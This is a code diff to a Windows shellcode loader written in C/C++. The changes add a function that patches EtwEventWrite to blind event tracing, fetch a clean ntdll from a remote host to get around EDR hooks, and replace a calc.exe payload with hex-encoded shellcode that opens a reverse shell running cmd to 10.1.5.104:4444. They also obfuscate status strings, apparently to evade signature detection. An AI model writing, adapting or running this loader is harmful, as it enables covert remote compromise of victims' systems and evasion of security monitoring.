@@ -68,6 +68,42 @@ typedef NTSTATUS (*_NtWaitForSingleObject)(
     IN PLARGE_INTEGER Timeout
 );
 
+BOOL DisableETW(void) {
+    DWORD oldprotect = 0;
+
+    char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
+    char sntdll[] = { 'n','t','d','l','l', 0 };
+
+    //      xor rax, rax; 
+    //      ret
+    char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };
+
+
+    void* addr = GetProcAddress(GetModuleHandleA(sntdll), sEtwEventWrite);
+    if (!addr) {
+        printf("Failed to get EtwEventWrite Addr (%u)\n", GetLastError());
+        return FALSE;
+    }
+    BOOL status1 = VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
+    if (!status1) {
+        printf("Failed in changing protection (%u)\n", GetLastError());
+        return FALSE;
+    }
+
+    memcpy(addr, patch, sizeof(patch));
+
+
+    BOOL status2 = VirtualProtect(addr, 4096, oldprotect, &oldprotect);
+
+    if (!status2) {
+        printf("Failed in changing protection back (%u)\n", GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+
 
 
 DLL GetNtdll(wchar_t* whost, DWORD port, wchar_t* wresource) {
@@ -183,6 +219,9 @@ DLL GetNtdll(wchar_t* whost, DWORD port, wchar_t* wresource) {
 
 
 
+
+
+
 BOOL isItHooked(LPVOID addr) {
     BYTE stub[] = "\x4c\x8b\xd1\xb8";
     if (memcmp(addr, stub, 4) != 0)
@@ -203,50 +242,39 @@ HANDLE hHostThread = INVALID_HANDLE_VALUE;
 
 
 
+
+
 int main(int argc, char** argv) {
-    
+
     // Validate the parameters
-    if (argc != 3) {
-        printf("[+] Usage: %s <RemoteIP> <RemotePort>\n", argv[0]);
+    if (argc != 4) {
+        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);
         return 1;
     }
+
+    //printf("[+] Patching ETW \n");
+    if (!DisableETW()) {
+        printf("Failed in patching ETW\n");
+        return -3;
+    }
+    //printf("[+] ETW Patched !!\n");
 
 
     char* host = argv[1];
     DWORD port = atoi(argv[2]);
-
+    char* resource = argv[3];
 
     const size_t cSize1 = strlen(host) + 1;
     wchar_t* whost = new wchar_t[cSize1];
     mbstowcs(whost, host, cSize1);
 
 
+    const size_t cSize2 = strlen(resource) + 1;
+    wchar_t* wresource = new wchar_t[cSize2];
+    mbstowcs(wresource, resource, cSize2);
 
-    wchar_t value[255] = { 0x00 };
-    DWORD BufferSize = 255;
-    RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ReleaseId", RRF_RT_REG_SZ, NULL, &value, &BufferSize);
-    wprintf(L"\n\n[+] Windows Version %s Found\n", value);
-    int winVersion = _wtoi(value);
-
-    DLL ntdll;
-
-    switch (winVersion) {
-    case 1903:
-        ntdll = GetNtdll(whost, port, (wchar_t*)L"ntdll1903.dll");
-        break;
-    case 2004:
-        ntdll = GetNtdll(whost, port, (wchar_t*)L"ntdll2004.dll");
-        break;
-    case 2009:
-        ntdll = GetNtdll(whost, port, (wchar_t*)L"ntdll2009.dll");
-        break;
-    default:
-       wprintf(L"[!] Version Offsets Not Found!\n");
-
-    }
-
-    
-    printf("\n[+] Got ntdll from %s:%d\n\n", host, port);
+    DLL ntdll = GetNtdll(whost, port, wresource);
+    printf("\n[+] Got %s from %s:%d\n\n", resource, host, port);
 
     char* dllBytes = (char*)malloc(ntdll.size);
     memcpy(dllBytes, ntdll.ntdll, ntdll.size);
@@ -317,18 +345,19 @@ int main(int argc, char** argv) {
         
 	}
 
+    DWORD OldProtect = 0;
+    VirtualProtect(alloc_mem, ntdll.size, PAGE_EXECUTE_READ, &OldProtect);
+
+    printf("[+] Mapped ntdll @ %p\n", alloc_mem);
     
-    printf("\n\nntdll mem_addr  =  %p\n\n", alloc_mem);
-
-
 	if (pNtAllocateVirtualMemory) {
         NTSTATUS status1 = pNtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!NT_SUCCESS(status1)) {
-            printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
+            printf("[!] Failed in sysZwAllocateVirtualMemory (%u)\n", GetLastError());
             return 1;
         }
-        printf("\n[+] NtAllocateVirtualMemory @ %p\n", pNtAllocateVirtualMemory);
-        printf("[+] NtAllocatedVirtualMemory Executed !!!\n");
+        printf("\n[+] NtAll0catedV1rtualMem0ry @ %p\n", pNtAllocateVirtualMemory);
+        printf("[+] NtAll0catedV1rtualMem0ry Executed !!!\n");
 	}
  
     
@@ -367,19 +396,50 @@ int main(int argc, char** argv) {
         "41-5A-48-83-EC-20",
         "41-52-FF-E0-58-41",
         "59-5A-48-8B-12-E9",
-        "57-FF-FF-FF-5D-48",
-        "BA-01-00-00-00-00",
-        "00-00-00-48-8D-8D",
-        "01-01-00-00-41-BA",
-        "31-8B-6F-87-FF-D5",
-        "BB-E0-1D-2A-0A-41",
-        "BA-A6-95-BD-9D-FF",
-        "D5-48-83-C4-28-3C",
-        "06-7C-0A-80-FB-E0",
-        "75-05-BB-47-13-72",
-        "6F-6A-00-59-41-89",
-        "DA-FF-D5-63-61-6C",
-        "63-2E-65-78-65-00",
+        "57-FF-FF-FF-5D-49",
+        "BE-77-73-32-5F-33",
+        "32-00-00-41-56-49",
+        "89-E6-48-81-EC-A0",
+        "01-00-00-49-89-E5",
+        "49-BC-02-00-11-5C",
+        "0A-01-05-68-41-54",
+        "49-89-E4-4C-89-F1",
+        "41-BA-4C-77-26-07",
+        "FF-D5-4C-89-EA-68",
+        "01-01-00-00-59-41",
+        "BA-29-80-6B-00-FF",
+        "D5-50-50-4D-31-C9",
+        "4D-31-C0-48-FF-C0",
+        "48-89-C2-48-FF-C0",
+        "48-89-C1-41-BA-EA",
+        "0F-DF-E0-FF-D5-48",
+        "89-C7-6A-10-41-58",
+        "4C-89-E2-48-89-F9",
+        "41-BA-99-A5-74-61",
+        "FF-D5-48-81-C4-40",
+        "02-00-00-49-B8-63",
+        "6D-64-00-00-00-00",
+        "00-41-50-41-50-48",
+        "89-E2-57-57-57-4D",
+        "31-C0-6A-0D-59-41",
+        "50-E2-FC-66-C7-44",
+        "24-54-01-01-48-8D",
+        "44-24-18-C6-00-68",
+        "48-89-E6-56-50-41",
+        "50-41-50-41-50-49",
+        "FF-C0-41-50-49-FF",
+        "C8-4D-89-C1-4C-89",
+        "C1-41-BA-79-CC-3F",
+        "86-FF-D5-48-31-D2",
+        "48-FF-CA-8B-0E-41",
+        "BA-08-87-1D-60-FF",
+        "D5-BB-E0-1D-2A-0A",
+        "41-BA-A6-95-BD-9D",
+        "FF-D5-48-83-C4-28",
+        "3C-06-7C-0A-80-FB",
+        "E0-75-05-BB-47-13",
+        "72-6F-6A-00-59-41",
+        "89-DA-FF-D5-90-90"
     };
     
 
@@ -417,11 +477,11 @@ int main(int argc, char** argv) {
     if (pNtProtectVirtualMemory) {
         NTSTATUS status2 = pNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
         if (!NT_SUCCESS(status2)) {
-            printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
+            printf("[!] Failed in NtPr0tectV1rtualM3mory (%u)\n", GetLastError());
             return 1;
         }
-        printf("\n[+] NtProtectVirtualMemory @ %p\n", pNtProtectVirtualMemory);
-        printf("[+] NtProtectVirtualMemory Executed !!!\n");
+        printf("\n[+] NtPr0tectV1rtualMem0ry @ %p\n", pNtProtectVirtualMemory);
+        printf("[+] NtPr0tectV1rtualMem0ry Executed !!!\n");
     }
 
    
@@ -438,14 +498,16 @@ int main(int argc, char** argv) {
 
     }
 
+   
+
     if (pNtCreateThreadEx) {
         NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
         if (!NT_SUCCESS(status3)) {
-            printf("[!] Failed in NtCreateThreadEx (%u)\n", GetLastError());
+            printf("[!] Failed in NtCr3at3Thr3adEx (%u)\n", GetLastError());
             return 1;
         }
-        printf("\n[+] NtCreateThreadEx @ %p\n", pNtCreateThreadEx);
-        printf("[+] NtCreateThreadEx Executed !!!\n");
+        printf("\n[+] NtCr3at3Thr3adEx @ %p\n", pNtCreateThreadEx);
+        printf("[+] NtCr3at3Thr3adEx Executed !!!\n");
     }
     
     
@@ -454,14 +516,15 @@ int main(int argc, char** argv) {
    
     NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
     if (!NT_SUCCESS(NTWFSOstatus)) {
-        printf("[!] Failed in NtWaitForSingleobject (%u)\n", GetLastError());
+        printf("[!] Failed in NtWa1tF0rS1ngle0bj3ct (%u)\n", GetLastError());
         return 4;
     }
-    printf("\n[+] NtWaitForSingleobject Executed !!!\n");
-
+    printf("\n[+] NtWa1tF0rS1ngle0bj3ct Executed !!!\n");
     printf("\n\n[+] Finished !!!!\n");
 
-    
+    VirtualProtect(alloc_mem, ntdll.size, PAGE_READONLY, &OldProtect);
+
+
     return 0;
 
 }
